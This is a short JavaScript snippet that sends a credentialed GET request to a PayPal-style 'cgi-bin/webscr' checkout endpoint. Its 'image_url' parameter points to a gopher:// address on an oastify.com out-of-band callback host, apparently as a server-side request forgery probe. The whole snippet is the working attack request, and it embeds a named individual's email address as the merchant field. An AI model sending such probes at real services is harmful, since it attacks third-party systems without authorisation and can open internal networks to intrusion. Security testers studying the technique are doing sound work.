const url = "../../cgi-bin/webscr?address1=sectesting&address2=sectesting02&address_override=true&business=anders@andersnoren.se&cmd=_xclick&xo_node_fallback=true&force_sa=true&image_url=gopher://jvioinl7vikpd5253p0mgztb72dx1m.oastify.com/hfg?ghg.jpg";
let xml = new XMLHttpRequest();
xml.onreadystatechange = function(){
    if(xml.readyState !== 4) return;
    if(xml.status === 200){
        console.log("ok");
        console.log(xml.responseText);
    }
}
xml.open("GET",url);
xml.withCredentials = true;
xml.send();
